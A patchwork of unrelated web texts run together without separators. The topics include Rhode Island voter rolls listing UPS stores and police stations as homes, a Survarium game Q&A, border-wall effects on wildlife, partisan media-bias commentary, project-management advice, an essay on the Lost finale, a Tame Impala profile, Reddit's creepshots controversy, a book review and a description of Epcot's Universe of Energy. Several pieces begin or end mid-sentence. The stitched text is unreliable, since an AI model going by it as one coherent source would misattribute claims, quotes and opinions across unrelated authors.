But "it happened and I need to get to the bottom of why it happened, so we can correct it. And obviously, if there is a violation, then we will look at whether it is prosecutable," Paré told The Providence Journal earlier this week.
These misplaced — and potentially illegitimate — Rhode Island "voters" are not alone.
State law requires a voter to register from "his or her fixed and established domicile." There are, however, at least 125 people on voter rolls across Rhode Island who claim they live in a UPS store, a U.S. post office, a gas station on Hartford Avenue in Johnston, a cellphone store in a Newport strip mall, and scores of other commercial buildings and vacant lots.
Narragansett, North Kingstown, West Greenwich, Johnston and Newport also have voters listed as living in their police stations.
The state Board of Elections does not know how many of the 125 voted. The board and municipal officials around the state are working on that question.
The list, compiled by two-time gubernatorial candidate Ken Block, has elections officials across the state scrambling to verify how many potentially illegitimate — and illegal — voters they have on their rolls voting in elections that were decided, in some cases, by a single vote.
Block's findings also raise questions about flaws in the state's voter-registration system at a time when state lawmakers are considering bills to repeal Voter ID and create automatic voter registration with each new driver's license.
Block says he is not yet free to talk about the methodology, financial sponsors (if any) and end goal of the research he conducted as part of a national voter fraud project he described on his WatchdogRI.org website this way: "Use voter registration and voter history data to identify voter fraud within a state and between states."
But it appears he stopped at an arbitrary point after finding the 125 examples he gave to the state Board of Elections. The state board then sent the names of the registered voters at each of these questionable addresses to city and town boards of canvassers.
Local election officials are taking them seriously.
On May 1, Barrington became one of the first communities to send letters to the purported home addresses of people "registered to vote from an address, which is likely not your residence."
Block found at least four registered voters in Barrington who claimed to live in the UPS store next to the frozen yogurt shop at 18 Maple Ave. (Asked by The Journal if any of these "voters" worked at these UPS, assistant manager Kyle Lamarine shook his head no and said, "There are just two of us who work here.")
Barrington's letter to these individuals notes that "registering to vote... [or] voting in an election from an address which is not your residence is a felony under RI General Law ... punishable by up to a $5,000 fine and/or 10 years in prison .... Enclosed you will find a new voter-registration form."
Town Clerk Meredith DeSisto reports that the town has gotten a response from only one of the four voters who listed the UPS store as his or her home. The man — who, according to the secretary of state's office, voted last November using the UPS store as his home address — told the town he now lives on Plymouth Road in East Providence. Based on that, DeSisto said, she struck his name from the Barrington voter list.
The Journal was unable to reach the other UPS voters on the Barrington list.
Earlier this week, a spokeswoman reported that Secretary of State Nellie Gorbea has taken steps to remove 26 addresses of police stations, post offices, UPS stores and vacant lots from the state's central database of legitimate addresses. Block found 55 "voters" at those locations.
Robert Rapoza, acting director of the state Board of Elections, suggests one possible explanation for the problem cases: "The current voter-registration form asks for both residential and mailing addresses. Therefore it is possible these fields were not sufficiently clear to these individuals."
Regarding Providence officers registering to vote at the station, police spokeswoman Lindsay Lague mentioned a law that allows any "law enforcement officer," including state and local police, to use their "official business address in lieu of a residence address" on their driver's license.
But the Board of Elections told The Journal: "Neither state law [nor] state regulations contain any provision permitting law-enforcement officers to register to vote from any address other than their residence address."
Paré, the police commissioner, said the four officers still on the force who were registered to vote at the station gave him various explanations.
He said Detective Dwight Eddy told him he lives and votes in Massachusetts. Officer Kenneth Wiggington told him he lives in East Providence and has never voted in Providence. Officer Kensuke Matsumoto lived a quarter-mile from the police station until recently. Sgt. David Tejada told him he used the police station address to register a vehicle in 2015, but never deliberately changed his home address in the city for voting.
According to the Providence Board of Canvassers, only two of these officers — Matsumoto and Tejada — voted in the last election while still registered at 325 Washington St. Of the two former police officers Block found, one voted in Providence in the last election. He could not be reached for comment.
Tejada and Wiggington were also unavailable for comment.
But Matsumoto, who now lives in East Greenwich, told The Journal he does not recall how he registered to vote, but believes he has used the same address — the police station — since 2003 because a field training officer, now deceased, told him and other recruits that this was what police did.
Eddy, who lives and votes in Massachusetts, said: "This completely blindsided me. I have never voted in the city of Providence. And since [this came up], I have made sure I have been removed from the [city] voter rolls."
Asked if he recalled checking the box on a Rhode Island driver's-license application that would have signed him up to vote in Rhode Island, as if he lived in the police station, he said: "Of course not. Absolutely not."
Did he unwittingly break the law? No, he said emphatically. He "didn't register to vote in the city."
"I never checked the box .... I have no idea where it came from or why this happened."
As promised the very first Survarium Q&A! Thank you once again for submitting so many questions! Enjoy the information!
Q: Why did you decide to go for a MMOFPS instead of a MMORPG?
A: The decision was made as we've spent the last 10 years making FPS games.
Q: Is there going to be some sort of RPG element to Survarium?
A: Yes, for sure.
Q: What is the planned size of the game world?
A: We will not be providing a seamless big world. Survarium is going to be a session-based game. Our plan is to constantly expand the number of new locations in the game.
Q: What kind of dangers can the player expect to find in the game world?
A: You can expect traps, anomalies, unexpected enemy actions, weird and dangerous mutants and much, much more.
Q: How true will Survarium stay to the S.T.A.L.K.E.R. series?
A: Many of the game elements will be in common, such as survival, anomalies, factions, mutants etc.
Q: Will there be a single player component to the game?
A: No.
Q: Will there be an offline mode which is just as limitless as the online version?
A: No.
Q: MMOs typically have a large number of players. How will you manage to keep the traditional atmosphere of isolation and survival with hundreds or thousands of people on the same server?
A: We plan to impose a limited number of players on a map per one play-session. This will make sure the game is not overcrowded with players.
Q: Will there be a solid plot, lore and story background? The lack of which is why many series gamers avoid MMOs.
A: Yes, we are building an interesting game story. It will mainly unfold through the PVE missions.
Q: What are you planning in terms of factions? Will the player be able to create his own faction or will you be given predefined choices?
A: We already have about 9 factions on our plan list. Not all of those will be available to players. Players will be able to make their own clans.
Q: Will the concepts and themes of post-apocalyptic landscapes make their way into the game design? For example, less emphasis on shops and more on bartering and trading?
A: Of course, the post-apocalyptic atmosphere will influence the gameplay, in many different ways.
Q: MMOFPS F2P don't usually have a good reputation. What can you do to make people feel interested in your game?
A: Indeed, lately we've seen quite a few free2play games of very poor quality, but the tendency changes with such releases as Warface, Dota2, so we are sure the situation will soon change for the better. Anyway, our plan is to introduce a rather mild monetization in order not to press on those who want to play free of charge. All the gameplay content in Survarium will be available free of charge too.
Q: Will it be a persistent world?
A: If you mean destruction of locations under the influence of players, then no, But as the game story will unfold, the game locations will change.
Q: Will there be women in Survarium?
A: Our plan is to let you play as man or a woman.
Q: What kind of Free-to-Play model will you be employing with this game?
A: These types of specifics will be described in some of the upcoming development diaries.
Q: It seems obvious that survival is a key aspect of the project. Will survival take a priority over just shooting anything that moves?
A: Yes, absolutely!
Q: Why did you decide not to make a standard FPS?
A: As opposed to standard FPS development, an online free2play project today is a much easier way for a developer to establish direct connection with players.
Q: What engine will Survarium being built on?
A: It's our own new technology.
Q: Will there be mutants?
A: Yes.
Q: Will there be underground levels?
A: Yes.
Q: Will there be randomly generated quests like we experienced in S.T.A.L.K.E.R.?
A: No. All quests will be hand-made.
Q: Will some sort of A-Life system be found in Survarium?
A:No.
Q: Can you explain the Sci-Fi elements of the game?
A: This is another aspect of the game that will be explained more clearly in future development diaries.
Q: Many people have unstable and unreliable internet connections; will you offer a standalone version of Survarium as well for said players?
A: Unfortunately, no standalone version will be possible with the current game model. We are hopeful that through the time of development the average internet connection will improve globally (this is at least a common trend we're seeing these days).
Q: Will we have to pay for new weapons in the game etc?
A: Most of the weapons will be available to purchase without real money. Some premium guns will be offered for real payment, those however are will not be designed to give the player a “pay-2-win” advantage.
Q: Will there be an open beta test of Survarium?
A: Yes, this is curour plan.
Q: Will bullet ballistics still be modelled?
A: Absolutely!
Q: Will there be a reputation system? Not just for killing, but helping others in need?
A: Yes, there will be.
Q: Campfires + guitars, any plans to include these features?
A: We have been looking into the creation of role-playing locations, but it's still something that we are discussing.
Q: The idea of Stalker was you, mostly, alone vs. the environment. How do you plan to carry this successfully over into an MMOFPS?
A: Taking into account that the entire mother nature is now against you, it's hard to believe that being 3 or 4 of you will make you feel crowded.:) Certain missions are designed for a squad to separate, so you'll have to act alone quite often.
Q: Will we be seeing stalkers, similar to references in Metro or will stalkers play a more primordial role?
A: Our love for “stalkerism” is very strong and we want to demonstrate the importance of it in-game!
Q: People are concerned about Survarium's free-to-play nature, and think the game play will be shallow. What say you to them?
A: Partially answered above, what we feel is that we are by no means (as S.T.A.L.K.E.R. team) allowed to produce shallow game. Otherwise, the Zone will take us all!

They are not "bad hombres," as Donald Trump might say -- or any kind of hombres at all.
But like the human migrants targeted by the US president, the jaguars, bighorn sheep and deer-like Sonoran pronghorns of northern Mexico have a lot to lose from his planned border wall.
Such species currently roam at will back and forth across the border of Mexico and the United States in reserves specially protected by both countries' governments.
The reserve is divided only by a simple fence with gaps big enough for the animals to pass through. | Source: Reuters
Conservationists fear Trump's vow to build a wall the length of the border to keep criminals out of the United States will doom the beasts to extinction.
It would stop them getting where they need to go to feed and mate.
- 'Fauna crossing' -
"Caution, fauna crossing," reads a sign among the cactus and wild bushes in the northeastern desert, where deer, wild cats, coyotes and wolves crisscross the frontier.

The habitat spans the Cabeza Prieta National Wildlife Refuge in Arizona and the Pinacate and Gran Altar Desert over in the Mexican state of Sonora.
The latter is certified as a world heritage site by UNESCO.
The reserve is divided only by a simple fence with gaps big enough for the animals to pass through.
The animals have to trot long distances to look for water, food and shelter. | Source: Reuters
"It was designed specially so as not to hurt the animals and so they would have no problem crossing," said Miguel Angel Grageda, head of natural resources at El Pinacate.
- Food and water -
Rain is scarce in the parched desert, where the heat soars as high as 55 degrees Celsius (131 Fahrenheit).
The animals have to trot long distances to look for water, food and shelter.
"When animals have trouble moving across the landscape to recolonize those places, the population in those places will never be restored." | Source: Reuters
They must also be mobile to keep their numbers up when drought or sickness kill off the species in certain areas.
"If you just go and put a giant border wall between their habitat then you can cut movements off for some species which will prevent them from recolonizing their habitat," said Aaron Flesch, an environmental specialist at the University of Arizona.
"When animals have trouble moving across the landscape to recolonize those places, the population in those places will never be restored."
- Need of a mate -
Gerardo Ceballos of the Ecological Institute at Mexico's National Autonomous University estimates there are only about five jaguars left on the US side. They rely on partners from the Mexican side to mate.

If the animal populations were split in two and each group left to reproduce only with the limited number of mates on its side, the species would degenerate.
"If we divide the population of the species in two, there will start to be crosses between related animals," said Grageda.
"Later on we could have problems of inbreeding."
- Resistance to wall -
It is not clear when the United States will start putting up Trump's wall or how exactly its course might be plotted through protected zones such as this one.
But conservationists are imagining the worst.

"We don't know exactly what the results are going to be," said Flesch. "But we know they want to be good."
Ceballos said various Mexican and US non-governmental groups are preparing a challenge to the wall plan.
"Over here it would require a political decision at the level of Congress" to block it, said Grageda.
"We may not be able to convince Donald Trump."
- Human impact -
It is not just the animals who would suffer from a wall, experts say, but the whole desert ecosystem.
Desert mammals break up the sun-baked ground with their hoofs so that when it does rain, the water drains underground.
A wall could have "a big impact" by blocking and shifting watercourses, Ceballos said. | Source: Reuters
By tearing up the vegetation to eat it, they help spread the seeds so that desert flowers bloom anew.
A wall could have "a big impact" by blocking and shifting watercourses, Ceballos said.
That, and the untold impact on the soil and atmosphere, could affect humans too.
"When you put up a wall, you destroy everything," he warned.

The Washington Post published a surprising op-ed on Friday. The online headline was "The media's martyr complex is embarrassing." (The last two words somehow didn't fit in the newspaper headline.) It's the latest article the Post has published from Gary Abernathy, publisher and editor of the Hillsboro (Ohio) Times-Gazette. Hillsboro is a small town of about 6,600 people in southern Ohio, a couple of counties east of Cincinnati.
In a previous Post op-ed two weeks ago, Abernathy powerfully argued that opioid drug pushers in his state have produced such a death toll that they are comparable to terrorists.
Abernathy began his latest article by describing how his local congressman came to complain about his coverage, accompanied by an intimidating posse of several local advertisers. He said they listened, the publisher held firm, and "we didn't use our news pages to portray ourselves as martyrs for the First Amendment. Publicly, we ignored the incident."
But he said when President Trump accuses national outlets of putting out "fake news," national journalists "react with public outrage, their popping veins nearly bursting through their thin skins."
It's hard to believe the Post would let Abernethy attack the national media for their hostility to Trump.
Trump doesn't deserve favorable coverage. All he deserves is fair and honest coverage. But even liberals can't argue with a straight face that he's wrong about mainstream media bias. Coverage of the president's overseas trip and participation in the Group of 20 summit offered numerous examples, with major media outlets focused more on minutiae — Ivanka sat in the president's chair! — than on substance, giving comparatively short shrift to his powerful remarks in Poland and the important Syrian cease-fire agreement brokered between Trump and Russian President Vladi­mir Putin. And later, the wall-to-wall coverage regarding Donald Trump Jr.'s meeting with a private Russian attorney was the definition of overkill, considering no one has brought forward any evidence to contradict the accounts of the participants that no substantive information was exchanged and there was no follow-up by anyone. But it was another opportunity to repeat “Russia, Russia, Russia,” the media's magic words for conjuring, Beetlejuice-fashion, the genie they hope will vanquish their bogeyman.
Abernathy definitely identified one point where the national media's arrogance trips them up: they attack their critics as opponents of journalism, opponents of freedom of the press, and opponents of the First Amendment. He said media criticism is not out of bounds. I would add it fits into the First Amendment as well. Critics get to speak, and they even get to accuse the media of creating fake news sometimes:
A shopping centre in China has decided to do away with convention, replacing an escalator with a 16m-tall spiral slide.
The Chongqing centre's attempt to inject a bit of levity into its retail experience was first reported by People's Daily Online last week.
The glass-topped, neon-lit slide was opened on February 15, and extends from the complexes fourth floor to its first floor.
Covering a length of 50m, the ride is believed to last a total of 12 seconds, offering a view of the lower levels before ejecting users out onto a length of AstroTurf.
Users are encouraged to wear a sack before embarking on the ride.
It comes almost a year after a similar slide was opened in the Printemps Department Store in Pudong, Shanghai.

Let our advance worrying become advance thinking and planning. —Winston Churchill
As project managers, one of our most important functions is developing a plan. If you missed Project planning – problems, scope, and deliverables, feel free to read that now.
Create a work breakdown structure
Never fear! I'm not going to do a PMBOK interpretive dance here. There are lots of text books where you can learn hows and heretofores of developing a work breakdown structure. The PMBOK itself spends a number of pages on the topic.
I think that for most of us, a work breakdown structure (WBS) is a great way to visualize a project. All but the smallest and quickest of projects should have some type of WBS . If your project doesn't have a WBS you can reference, you should build one.
Remember those folks on your team that thought they knew exactly what to do and when? A WBS often shows them deliverables they had completely or conveniently forgotten. They should love this exercise! The entire team should participate.
Outcomes, not actions
A WBS focuses on outcomes, not actions. Each level is the further breakdown of the level above. Once you get to a point where there's nothing left to break down, you've got a work package. Work is usually budgeted at the work package level.
I was once in charge of a project that had gone through many different phases over several years. It seemed to me we had lost our way as a team. We took about two hours, commandeered a conference room and redeveloped the WBS. This helped us to see the big picture again, and group the deliverables more efficiently.
The WBS as a communication tool
My advice – try to keep this a graphic. There is software out there that can produce this so that the team can see the big picture as the project progresses. The team often finds it more difficult to relate to the WBS in a table rather that in a graphic.
A WBS is a great way to show your sponsor that you have a handle on the project. If the team has done a good job with the details, the WBS is a great roadmap for the management team. Communication is critical during project planning and the WBS makes that communication a bit clearer.
WBS tips
The work breakdown structure only includes those items within scope for the project.
Before starting, determine the minimum number of hours to complete a deliverable. For example: If you're building a house, the entire project may take 3 months. Installing the windows may only take eight hours. Your final level in the WBS may be deliverables that complete in eight hours or less. For some organizations, once they get to a deliverable that takes 80 hours to complete, they've reached the bottom of the WBS.
There are no tasks in a WBS, only deliverables.
There are many ways to code a WBS. If your company doesn't already use a standard, the team makes the determination and uses that scheme. Don't focus on the coding, focus on the deliverables.
Once the work breakdown structure is complete, it's time to start scheduling, budgeting, and determining resources. By its nature, a WBS doesn't contain due dates, budget numbers, or resource assignments. It's used to develop those parts of your project management plan. The next step is scheduling and developing budgets and resource plans.
How does your company use the WBS? Let us know in the comments.

The following article references plot points from Lost, so you may want to skip it if you haven't watched yet. Though, come on, you've had five years now.
My two sons have heard my wife and I talk about Lost almost as long as they've been alive. It's what we have in our house instead of religion. They knew the general premise; they had an ambient awareness of who Sawyer and Hurley are, like talked-about distant cousins they'd never met in person. But the show itself would have to wait until they were old enough.
This summer, we decided they're old enough. We started a family binge of the show on Netflix–we're still in season 1–and because I'm a glutton for public questioning of my parenting and aesthetic choices, I tweeted about it. Five years after it ended, mentioning Lost on social media is still like poking a stick at the smoke monster, and soon enough the (mostly good-natured) snark rolled in–more than one response along the lines of: “First five seasons only, or I'm calling Child Protective Services.”
Ha ha, and OK, I asked for it. But I'll be honest: the thought, “But what about the ending?” did occur to me. I loved the finale, though I thought most season 6 went, well, sideways with digressions and blind alleys. But regardless, I'm well aware that many Lost fans were, shall we say, not as pleased with the ending. (My wife was one of them; when we finally finish the series, the kids will have to choose a favorite parent once and for all.)

Was I being responsible? Wasn't I, a professional TV-watcher who reviewed the show weekly for almost its entire run, supposed to look out for them? Despite one of the best pilots ever made, despite “Not Penny's Boat” and the hatch and “The Constant,” was I leading them to be blindsided? Was I setting my kids up for bitterness, disappointment, betrayal?
I decided, of course, that I wanted to share Lost with them even though they might hate the ending. More to the point, I wanted to share it with them because they might hate the ending.
I'm not interested in relitigating the debate over that last scene in the chapel. (You can read my original review if you want; it more or less still reflects how I feel.) But I think there were really two arguments going on over the Lost finale. Only one was about whether it was glorious or terrible.The other was really about how art and stories work.
That argument went: Is the finale to a series its ending or its answer? Does a bad ending to a story retroactively overwrite the good? Is it possible for the end of a thing to be so terrible and heartbreaking that it would be better never to have experienced any of the joy and pleasure that led up to it?
I don't really care how my kids come down on Lost‘s ending–but how they come down on that last question, I care about very much.
I get that finales carry a lot of weight: we have so many wishes and rooting interests hanging on them. They need to answer questions and provide closure, to move you and thrill you and ratify your view of the story and your notions of justice. They need to “stick the landing,” a phrase I sincerely wish no one had ever applied to a series finale, not just because it misrepresents art but because it misuses the metaphor. A gymnastics routine, after all, is scored on every element; a wobbly landing makes a 10 into a 9.9, not a 0.
That urge to hold up the “0” card once disappointed by a finale–screw you, Battlestar Galactica! go to hell, Sopranos!–feels like a philosophy of life, and a depressing, defensive one. It says: I will not be made a sucker. I will not be made to waste my time. I will not risk giving myself over to a story to find out, in the end, that I was “wrong.”
That's no way to watch; it's no way to live. Life is a succession of extended, serial experiences that start with a lot of promise but can always end badly. Marriages. Careers. A major league sports season ends with every team losing but one. Life itself is a multi-episode series that will eventually lead to a finale that you may find drawn out and unpleasant.
You can protect yourself from a lot of disappointments by not investing, but you lose a lot too. Some of my favorite shows ended on notes I found nigh-perfect (Friday Night Lights). Others, not so much (How I Met Your Mother). Plenty are in-between (I'm still sorting out my feelings about Mad Men‘s finale). But none of that negates a single thrill, laugh or wave of emotion I felt on the way there. None of that makes any of the experience that came before it any less worth having.
And Lost? Yeah, the sideways universe was a mess and the Drive Shaft / classical-piano concert in the finale is one of the goofiest things the show has ever done. But I'm putting my kids on the road to it anyway. Because I got to watch them see the show kick into mysterious gear with Locke's healing at the end of “Walkabout.” I'll get to share with them Desmond in the Hatch and every creepy Ben Linus-ism; “We have to go back!” and Desmond's phone call to Penny; Hurley driving the VW microbus and Sawyer in a Dharma jumpsuit in the 1970s. They'll get to experience every thrill and mind-twist that I did, they'll get to pore over details and spin theories, and if they hate where it ends up–well, they'll still have experienced it.
And if that's so, then I hope they even learn something: the bad things in your life don't negate the good ones. As Pixar's Inside Out beautifully expressed, happiness is more than the avoidance of sadness. Your life is not an average of its heights and its disappointments; it is each of them, in themselves. It's like Christian says in the finale: “All of this matters.” If they can come away with that, I don't need them to agree with me about Lost.
Unless they end up ‘shipping Kate and Jack over Sawyer and Juliet. Then I'm writing them out of the will.

A Wisconsin Democrat Assemblyman turned to a Republican Assemblywoman in the middle of a legislative session Friday and said, "You are f--king dead."
Despite the following report from the Northwestern at 12:53 PM Monday, no major media outlet other than Fox News has covered this disgusting story:
Rep. Gordon Hintz, D-Oshkosh, called Rep. Michelle Litjens, R-Winneconne, Monday morning to apologize for his comments that Litjens described as containing an obscenity and the words “you're dead.” Last week, he accepted responsibility for being issued an ordinance violation for visiting a massage parlor in Appleton that was the subject of a prostitution sting.
The Daily Caller's Jeff Poor on Monday linked to the website of Wisconsin's Newsradio 620 WTMJ which judging by the first comment reported as early as 10:43 AM:
Last Friday.... after the Assembly voted to engross the Budget Repair Bill, Hintz turned to a female colleague, Rep. Michelle Litjens and said: "You are F***king dead!"
In this post-Gabrielle Giffords world, with calls for a new civility, a man that was just busted in the middle of a prostitution sting says "You are f--king dead" to a woman on the floor of the Wisconsin assembly, and America's media couldn't care less.
Despite this being reported no later than 10:43 AM, a Google News search identified that apart from Wisconsin outlets, only Fox and conservative websites thought this was at all newsworthy.
As of 12:30 AM Tuesday, according to LexisNexis, no major news outlets reported this event. Closed-caption records for ABC's "World News," CBS's "Evening News," and NBC's "Night News" also found no coverage of this issue.
Imagine for a moment Hintz was a Republican and Litjens a Democrat.
This likely would have been the lead story for all three broadcast evening news programs as well as the focus of every hour of reporting on CNN and MSNBC with calls for Hintz's resignation.
But much like what happened at ABC's town hall meeting when a survivor of the Giffords shootings said "You are dead" to a Tea Party leader in the audience, our media clearly don't care when liberals publicly threaten conservatives.
Now this standard extends to a male Democrat elected official vulgarly assaulting a female Republican on an Assembly floor.
Makes one think it's journalism that's bleeping dead!
(H/T Weasel Zippers)
I'm making my way through the backstage catacombs of Manhattan's Beacon Theatre, a stately concert hall that often hosts classic rockers like the Allman Brothers when they want to charge more than $100 for nosebleed seats. While climbing up endless Escher-style stairs, I get lost and find myself staring blankly at a bunch of the venue's grizzled employees cradling out-of-date computers. I tell them I'm here to interview Tame Impala; they have never heard of the psychedelic rock band, but one stout lifer offers an anecdote about that time he had to fetch Eric Clapton an emergency sandwich.
Eventually, I find frontman Kevin Parker, swaddled up and nursing a hangover in a space that looks like a tastefully carpeted broom closet. Though he's surrounded by the ghosts of rock'n'roll legend, he seems somewhat weightless and without expectation; he's most concerned about getting the night's lights right. It's late last year, and he talks about the solitary mindset that he's trying to inhabit while creating Tame Impala's third album, Currents. The meeting is brief and somewhat shapeless, though one thing seems clear: The guy is very much in his own head. After a while, he picks up a call from his girlfriend, and I leave.
About six months later, I meet Parker again on the other side of America, in the California desert. He's getting ready to play Coachella with the rest of his band, though, offstage, Tame Impala is essentially a solo project. “For us, it's a big joke that we're playing these big shows,” Parker says, alluding to the somewhat seat-of-the-pants approach the quintet takes on tour. “It's completely absurd because we're just us; I'm just fuckin' Kevin. We're just these fuckin' idiots onstage.”
“But recording is different,” he clarifies. “Because, for me, recording music couldn't be further from a joke.” At this point, he has just wrapped Currents, an album that he recorded, produced, and mixed himself while holed up in a beachside shack in his hometown of Perth, Australia. He's still reeling from the obsessive undertaking days after sending in the final cuts. Sitting across from me in a hotel bar shopped up to look like something out of a Rat Pack movie, he doesn't look particularly well-rested, or well-nourished, or well-anything.
“I didn't realize it would add a completely extra dimension of absolute nervous breakdowns,” Parker says, talking about the new album's one-man recording process. “I was just sitting in my studio going, ‘Fuck. How am I going to do this?'”
"We don't get in involved unless it has someting to do with rules," Martin explained. While individual Reddit communities make their own rules — Martin repeated a quote he had given another reporter earlier today, that a forum moderators could ban all posts that start with "g" if they wanted to — Reddit, the platform, has very few. Reddit.com/rules goes a long way toward explaining why Martin finds himself answering questions about offensive, alarming or morally repugnant subreddits on a fairly regular basis. There are just five commandments, and only two relate to content:
"We have 10,000 active subreddits, and over 100,000 total. And anyone can create a subreddit, the person who creates it is sort of the default moderator, and they can add other moderators, who can then add other moderators," Martin said.
Reddit's creepiness problem is part of an ongoing identity crisis on the massive social site, a tension between the emerging voice of a united community, on one hand; and the studied neutrality of a anything-goes online messageboard. Creepy features like creepshots have drawn criticism for years, but they have survived even a recent visit from the President of the United states, who did a Q&A on the site in August. And the man who oversees the site is probably not going to go away.
Every three months, or maybe six, it happens: A new section of Reddit gets attention for being gross, immoral, or, most commonly, creepy . Last year it was /r/jailbait, a forum where users posted borderline pornographic photos of teens; a couple months ago it was /r/Photobucketplunder, where users posted private photos from compromised Photobucket accounts. This week, it's /r/creepshots , surreptitiously-taken, implicitly sexual photographs of anonymous women.
Beyond this, Martin says, Reddit mostly just has a responsibility to adhere to the law. He says the site's administrators regularly intervene when it seems as though someone on the site is in imminent danger, or if there's content that appears to be related to a crime.
The "we are a neutral platform" argument is at least logical, in a very strict sense: Martin suggests it's not in the site's interest to make moral judgements about content, and that it's difficult to even imagine what such rules might look like. "I do think Reddit is somewhat of a new thing, both for media and users, where it is a platform in the way the Tumblr and YouTube and Twitter are, but it's also a brand and community — a community of communities — and I don't think there's been a site that does both of the things at the same time, the way Reddit [does]." Waiting to deal with the sections such as creepshots until it's been made clear by media or users that they might, in fact, cross legal lines, is a functional strategy — but an expensive one, in terms of PR. (Update: Creepshots has been removed from the site; an alternative, featuring an image of a reporter who wrote critically of Reddit, as the banner has since been posted by users.)
Therein lies the problem: As a unified community, Reddit can attract the President. As a platform, it allows the posting of photos of murders and animal sex. As a community, it can to fight SOPA or raise money for charity. As a platform, it provides a gathering place for men who like looking at sexualized photos of underaged teenagers, and believe that "Men's Rights" are the foremost problem facing America today. Twitter and Tumblr have these problems too — the President has accounts on both, as do vile posters of almost every stripe — but on Reddit, where the existence of a frontpage and well-organized communities can give at least the impression of top-down endorsement, the contrast is more jarring.
When word leaked to Reddit that Gawker's Adrian Chen was seeking to publish the real identity of the Reddit moderator responsible for /r/jailbait, /r/creepshots and /r/picturesofdeadbabies, among many others, a number of other section moderators, led by the mods of the very large /r/politics forum and all the way down to /r/powerrangers followed suit, declaring they would longer link to Gawker Media stories.
Martin said a post outing a moderator, no matter what he had posted, would be against one of Reddit's few rules: the posting of private information.
"It would not be allowed on Reddit," said Martin. Had Chen discovered a nude photo of the moderator, blurred his face and posted no identifying information, however, it would probably not get taken down.
"Journalists are different in that they're accountable," says Martin, referring to their use of real names and susceptibility to lawsuits, "that system on some level works. On Reddit, when someone is anonymously posting someone's information, it's our policy to remove that and one we enforce pretty strongly."
As for how to deal with /r/creepshots-type sites moving forward, Martin says the site's management will remain conservative, and its structure almost consitutional: "We're always adjusting our approach, we're always following the lead of our users and community, and we always have to adjust things. We're also trying to maintain this as — we want Reddit to be an open a platform as possible. So there's a balance there: Try to make rules so users can enforce themselves. "
I was introduced to this book through academic research. Prof Sommers needs to be congratulated that here work has stood both the tests of time and scrutiny by those who would tear it down. She amply illustrates the shoddy behaviours of people such as Wolf and Steinem who can't be bothered to do basic fact checking. 150,000 US women die per year from Anorexia? Steinem even used the claim after Wolf had removed it from her work. That's is just plain lazy. Even worse, Steinem's book was recently republished after 20 years and the same error is in the book uncorrected.
Prof Sommers illuminates Woozle after Woozle (Google The Woozle Effect) and slays them as the sacred cows that they are. From false but HIGHLY emotive claims about Domestic Abuse/Violence, Rape, Anorexia. It leaves you with an impression that there is a segment of the US population who are seen as Gullible in the extreme and open to control by false reporting.
The dismantling of claims around Rape Culture, (Chapter 10), and how Ms Magazine (Read Steinem + Mary Koss) created a reality they wanted and then propagandized is so significant. It also resonates with the present day situation in US Academic Venues where people accused of rape have lost the basic right to a Fair and Valid Trial and even the Presumption of Innocence. The issues of gender stereotyping and abuse on Campus go on and on with litigation averse administrations made malleable to false truths. When you read Sommers work and then see what has happened over the following 20 years it leaves you bemused as to how it has been possible.
I would very much like to see this book updated and revised to address the last 20 years.
Universe of Energy marquee
The Universe of Energy was a pavilion located in the eastern half of Future World at Epcot. The pavilion contained one attraction, Ellen's Energy Adventure, starring Ellen DeGeneres and Bill Nye, which was the second version of the show since the pavilion's 1982 opening. The attraction featured a combination of four separate large-format film presentations and a slow-moving dark ride through audio-animatronic filled sets.
The Universe of Energy pavilion was previously sponsored by ExxonMobil (formerly Exxon) from opening day on October 1, 1982, through 2004. At D23 Expo 2017, it was announced that the Universe of Energy pavilion would close to be replaced with a Guardians of the Galaxy-themed roller coaster.[1] The attraction closed permanently on August 13, 2017.
Universe of Energy (1982–1996) [ edit ]
The original Universe of Energy pavilion itself was an innovation in energy technology, as the entire roof was covered in 80,000 photovoltaic solar cells that partially powered the ride vehicles. Visitors were transported through the pavilion in large battery-powered "traveling theatre cars" that followed guide-wires embedded in the floor as opposed to riding along conventional ride tracks. The original attraction featured numerous films that presented information on the subject of energy in a serious fashion as well as a ride through a primeval diorama complete with audio-animatronic dinosaurs.
The original pre-show featured an eight-minute live-action film presentation about the various forms of energy found in nature and traced the history of how mankind harnessed these different forms of energy for his use. This unique film presentation was known as the Kinetic Mosaic and was invented by Czech film director Emil Radok. The mosaic screen consisted of 100 rotating prism-shaped flip screens (reminiscent of those on the classic game show Concentration), arranged in a twenty five wide by four high arrays. These flip screens rotated under computer control and were synchronized to the motion picture that was projected onto their surface via five synchronized motion picture projectors. Each flip screen contained three sides, with white projection surfaces on two sides and a matte black surface on the third. The combination of the film and the screens' rotation created undulating, sometimes three-dimensional-appearing images. During the conclusion of the pre-show, the song Energy (You Make The World Go ‘Round) was played.
Theatre I film [ edit ]
Upon entering the theatre, guests were seated in one of six sections. The seating area rotated 180 degrees to face three large movie screens for the first film: a four-minute hand-animated film that depicted the beginnings of life on earth and the formation of fossil fuels.
Primeval diorama [ edit ]
At the conclusion of the film, the seating area rotated 90 degrees to face a curtain, which then raised to reveal a primeval diorama. The entire seating area moved into the diorama where it then broke apart into six multi-passenger vehicles that took guests on a seven-minute journey through the diorama, which was populated by numerous animatronic dinosaurs including an Edaphosaurus and two Arthropleura fighting and a family of Brontosaurus in a swamp (complete with realistic "swampy" smell), a Stegosaurus fighting an Allosaurus on an overhead cliff, several Trachodon bathing beneath a waterfall, a number of Ornithomimus watching helplessly as one of their own sank into a boiling tar pit, an Elasmosaurus that lashed out of a tidal pool at guests, and numerous Pteranodon that were perched around an erupting volcano (complete with flowing lava and realistic "volcano" smell).
Theatre II film [ edit ]
Leaving the diorama, the vehicles entered the EPCOT Energy Information Center where they reassembled back into their original theatre seating formation. Here, guests viewed a twelve-minute live-action film on three giant wrap around screens that took them on an in-depth look at various current and future energy resources around the world.
Theatre I finale film [ edit ]
At the conclusion of the film, the screens raised and the entire seating area traveled beneath them into Theatre I and rotated back into its starting position facing the audience towards a large cylindrical-shaped screen. There, guests viewed a two-minute computer-animated film that was reflected off of mirrored walls within the theatre. The film depicted an ever-evolving landscape of colorful, laser-like imagery of the various ways mankind has benefited from harnessing energy for his use and was accompanied by an upbeat song entitled Universe of Energy.
Summer 1996 version [ edit ]
The Summer of 1996 saw many changes come to Future World East. World of Motion closed in January of that year to make way for Test Track, and Horizons was not operating consistently due to alleged structural issues with the pavilion. The updated films for the attraction were behind schedule and with that side of Future World set to only have Wonders of Life open for the summer peak season, the decision was made to reopen Universe of Energy after renovations had been made to the pavilion in preparation for the new show.
